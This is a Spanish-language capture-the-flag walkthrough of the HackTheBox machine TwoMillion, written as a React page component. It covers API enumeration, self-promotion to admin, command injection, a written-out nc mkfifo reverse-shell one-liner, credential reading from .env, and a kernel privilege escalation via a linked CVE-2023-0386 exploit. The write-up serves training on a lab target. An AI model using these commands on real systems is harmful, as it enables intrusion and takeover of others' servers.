import React from "react";
import { useImageLightbox } from "@/components/ImageLightbox";

export default function TwoMillion() {
  const { LightboxImage, LightboxOverlay } = useImageLightbox();
  return (
    <>
      <LightboxOverlay />
      <article className="prose prose-invert">
      <br />
      <LightboxImage src="/images/Blog/Miniaturas/twomillion.png" alt="TwoMillion machine thumbnail" className="mx-auto" />
      <br />
      <p><strong>Descripción:</strong> TwoMillion es una máquina Linux de dificultad fácil centrada en vulnerabilidades en 
      una API REST, validación inadecuada de entrada y un CVE de escalada de privilegios a través de una vulnerabilidad de 
      overlayfs. El objetivo es enumerar la API, explotar fallos de validación para obtener acceso y luego escalar privilegios 
      abusando de una vulnerabilidad de kernel.</p>
      <br />


      <strong>Enumeración</strong>
      <p>Comenzamos con un escaneo inicial de puertos usando <code>nmap</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p- -n -Pn --open -sS --min-rate 2000 {IP}`}</pre>
      <br />
      <p>Parámetros:</p>
      <ul>
        <li><code>-p-</code> escanea todos los puertos</li>
        <li><code>-n</code> evita resolución DNS</li>
        <li><code>-Pn</code> no realiza descubrimiento de hosts</li>
        <li><code>--open</code> muestra solo puertos abiertos</li>
        <li><code>-sS</code> SYN stealth scan</li>
        <li><code>--min-rate 2000</code> velocidad mínima de paquetes</li>
      </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_nmap_1.png" alt="nmap first scan" className="mx-auto" />
      <br />

      <p>Se detectaron puertos abiertos. Realizamos un escaneo más detallado:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`nmap -p22,80 -n -Pn -sCV {IP}`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_nmap_2.png" alt="nmap second scan" className="mx-auto" />
      <br />

      <p>Vemos las versiones de los servicios SSH y HTTP. Realizamos una enumeración adicional del servidor web con <code>whatweb</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`whatweb http://{IP}`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_whatweb_1.png" alt="whatweb scan" className="mx-auto" />
      <br />

      <p>Aquí nos está diciendo que hay un error en la resolución de nombres dado que la ip resuelve a <code>http://2million.htb/</code>, por lo 
      que debemos añadir esta entrada a nuestro archivo <code>/etc/hosts</code>.</p>
      <br />

      <h2>Enumeración del Servicio Web</h2>
      <p>Al acceder al servicio web nos encontramos con un portal parecido al HackTheBox donde la idea es que los usuarios se registren, hagan máquinas y compitan.</p>
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_web_2.png" alt="web interface" className="mx-auto" />
      <br />

      <p>Que sucede que al intentar registrarnos nos piden un código de invitación. Para descubrir las rutas de la página usamos herramientas como <code>ffuf</code>:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`ffuf -u http://2million.htb/FUZZ -w /usr/share/Seclists/rockyou.txt -mc 200 -fs 64952 -t 20`}</pre>
      <br />
      
      <p>Parámetros:</p>
      <ul>
        <li><code>-u</code> URL base a escanear</li>
        <li><code>-w</code> archivo de wordlist</li>
        <li><code>-mc</code> códigos de estado a mostrar</li>
        <li><code>-fs</code> tamaño de respuesta a ignorar</li>
        <li><code>-t</code> número de hilos concurrentes</li>
      </ul>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_1.png" alt="api enumeration" className="mx-auto" />
      <br />
      
      <p>Y vemos que existe una ruta /invite a la que vamos a echar un vistazo.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_2.png" alt="web interface" className="mx-auto" />
      <br />
      <p>Al revisar el código fuente de la página, vemos que existe un archivo en JavaScript que nos llama la atención: <code>inviteapi.min.js</code>. 
      Lo que vemos que el código esta ofuscado, por lo que nos lo copiamos y procedemos a desofuscarlo, yo utilicé la herramienta  
      <a href="https://thanhle.io.vn/de4js/" target="_blank" className="text-blue-500 hover:underline" rel="noopener noreferrer"> https://thanhle.io.vn/de4js/</a></p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_3.png" alt="web interface" className="mx-auto" />
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_4.png" alt="web interface" className="mx-auto" />

      <br />
      <p>Al ver el código desofuscado, notamos que hay una función llamada <code>makeInviteCode</code> que se encarga de generar códigos de invitación.
      Esta función puede ser explotada para generar códigos válidos. Vemos que se tramita por peticiones tipo POST</p>
      <br />
      <p>Procedemos a crear una petición POST manualmente con <code>curl</code> para generar un código de invitación:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`curl -X POST http://2million.htb/api/v1/invite/how/to/generate`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_5.png" alt="web interface" className="mx-auto" />
      <br />
      <p>Y vemos que nos devuelve una información cifrada sin embargo en el propio mensaje nos dan el tipo de cifrado que utilizaron en este caso ROT13. 
      Procedemos a descifrarla, yo utilicé una herramienta online para hacerlo:
      <a href="https://cryptii.com/pipes/rot13-decoder" target="_blank" className="text-blue-500 hover:underline" rel="noopener noreferrer"> https://cryptii.com/pipes/rot13-decoder</a></p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_6.png" alt="web interface" className="mx-auto" />
      <br />
      <p>Ahora nos indican que para solicitar un código de invitación, debemos hacer una peticion a la ruta <code>/api/v1/invite/generate</code>. Vamos a hacerlo:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`curl -X POST http://2million.htb/api/v1/invite/generate`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_7.png" alt="web interface" className="mx-auto" />
      <br />
      <p>Nuevamente nos dan la respuesta cifrada en este caso en base64. Con lo que procedemos a descifrarla:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`echo "base64_string_here" | base64 -d`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_codigo_8.png" alt="web interface" className="mx-auto" />
      <br />
      <p>Finalmente obtenemos nuestro código de invitación, por lo que procedemos a registrarnos en la aplicación:</p>
      <br />

      <p>Accedemos a la página de http://2million.htb/register y nos registramos</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_registrar_1.png" alt="user registration" className="mx-auto" />
      <br />
      <p>Luego accedemos a la página de http://2million.htb/login y nos logueamos</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_registrar_2.png" alt="registration form" className="mx-auto" />
      <br />
      <p>Vemos que ahora podemos acceder a un panel de usuario el cual vamos a explorar.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_registrar_3.png" alt="registration success" className="mx-auto" />
      <br />
      <p>Vemos que en una de las funcionalidades del panel de usuario nos permite descargarnos una ovpn.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_registrar_4.png" alt="invite code" className="mx-auto" />
      <br />
      <p>Analizando la peticion en <code>Burpsuite</code> vemos que estamos haciendo una petición GET a la API.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_registrar_5.png" alt="account activated" className="mx-auto" />
      <br />
      <p>Analizando el tráfico en <code>Burpsuite</code>, observamos que la aplicación realiza peticiones a una API en <code>/api/v1/</code>.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_api_2.png" alt="api enumeration" className="mx-auto" />
      <br />
      <p>Probamos acceder a estos endpoints y vemos que hay varios pertenecientes a admin uno de ellos para actualizar su configuración:</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_api_3.png" alt="api endpoints" className="mx-auto" />
      <br />
      <p>Y vemos que el servidor nos responde, lo que tenemos que afinar ciertos parámetros, agregamos el <code>Content-Type: application/json</code> en la petición.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_api_4.png" alt="api user invite" className="mx-auto" />
      <br />
      <p>Agregamos el parámetro <code>email</code> en la petición.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_api_5.png" alt="api user invite" className="mx-auto" />
      <br />
      <p>Agregamos el parámetro <code>is_admin</code> en la petición.</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_api_6.png" alt="api user invite" className="mx-auto" />
      <br />
      <p>Vemos que el usario admin con id 13 tiene el campo <code>is_admin</code> en <code>1</code>, ahora vamos a hacer una peticion a la ruta /api/v1/vpn/generate</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Enumeracion/enumeracion_api_7.png" alt="admin user creation" className="mx-auto" />
      <br />


      <strong>Explotación</strong>
      <p>En la propia solicitud vemos que podemos dentro del parámetro <code>username</code> podemos inyectar comandos en el servidor. </p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Explotacion/enumeracion_api_8.png" alt="admin user creation" className="mx-auto" />
      <br />
      <p>Con esto podemos lanzarnos una reverse shell, para ejecutar comandos en el servidor desde nuestra consola. Recomiendo los recursos:</p>
      <ul>
        <li><a href="https://github.com/brightio/penelope" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:text-blue-400 underline"> https://github.com/brightio/penelope</a> Para ponernos en escucha, es como netcat mejorado.</li>
        <li><a href="https://www.revshells.com/" target="_blank" className="text-blue-500 hover:underline" rel="noopener noreferrer"> https://www.revshells.com/</a> Para lanzarnos una reverse shell, escogí en este caso la de linux, nc mkfifo </li>
      </ul>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`penelope.py`}</pre>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 4444 >/tmp/f`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Explotacion/explotacion_1.png" alt="reverse shell payload" className="mx-auto" />
      <br />

      <p>Vemos que recibimos la reverse shell en nuestro equipo y estamos en el servidor, estamos como usuario <code>www-data</code>, donde vemos que en su directorio hay un archivo .env :</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`ls -la`}</pre>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`cat .env`}</pre>
      <br />    
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Explotacion/explotacion_2.png" alt="shell execution" className="mx-auto" />
      <br />
      <p>Obteniendo un par de credenciales del usuario admin, nos autenticamos como admin:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`su admin`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Explotacion/explotacion_3.png" alt="user flag" className="mx-auto" />
      <br />
      <p>Nos movemos al directorio del usuario admin y leemos la primera flag.</p>
      <br />


      <strong>Escalada de Privilegios</strong>
      <p>Revisando en los archivos que tenemos acceso como usuario admin vemos el siguiente archivo:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`cat /var/mail/admin`}</pre>
      <br />

      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Escalada/escalada_1.png" alt="kernel version" className="mx-auto" />
      <br />

      <p>Donde nos están indicando que el servidor tiene problemas con el kernel y que debería ser actualizado el sistema operativo. Esto nos da una ruta para la escalada.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`uname -a`}</pre>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Escalada/escalada_2.png" alt="exploit compilation" className="mx-auto" />
      <br />  
      <p>Vemos que esa versión de kernel es vulnerable y que puede ser explotada a través de CVE-2023-0386, una vulnerabilidad de Overlayfs que permite escalada de privilegios local.
      Descargamos el repositorio en local y nos lo copiamos al servidor:</p>
      <a href="https://github.com/puckiestyle/CVE-2023-0386" target="_blank" rel="noopener noreferrer" className="text-blue-500 hover:text-blue-400 underline"> https://github.com/puckiestyle/CVE-2023-0386</a>
      <br />
      <br />
      
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Escalada/escalada_3.png" alt="exploit execution" className="mx-auto" />
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Escalada/escalada_4.png" alt="privilege escalation" className="mx-auto" />
      <br />

      <p>Para copiar el repositorio al servidor, lo comprimimos, nos montamos un servidor HTTP, en nuestra máquina local en el directorio donde comprimimos el repositorio:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`python3 -m http.server`}</pre>
      <br />
      <p>Y desde el servidor objetivo, nos lo descargamos, lo descomprimimos:</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`wget IP:8000/repositorio.zip`}</pre>
      <br />
      <p>Ahora para poder ejecutar la herramienta en el propio readme de github nos ponen que debemos tener 2 terminales en el servidor por lo que nos vamos a autenticarnos por ssh como el usuario admin.</p>
      <br />
      <pre className="rounded bg-muted p-4 overflow-auto">{`ssh admin@IP`}</pre>
      <br />
      <p>Ejecutamos los pasos que nos indica el readme del exploit:</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Escalada/escalada_5.png" alt="root access" className="mx-auto" />
      <br />
      <p>Vemos que pudimos obtener acceso como root, por lo que procedemos a leer la flag final:</p>
      <br />
      <LightboxImage src="/images/Blog/Máquinas/TwoMillion_HTB/Escalada/escalada_6.png" alt="root flag" className="mx-auto" />
      <br />

      <strong>Conclusiones</strong>
      <p>La importancia de mantener sistemas actualizados, validar adecuadamente las entradas del usuario y aplicar principios de control de acceso son esenciales para prevenir estos tipos de compromisos.</p>
    </article>
    </>
  );
}
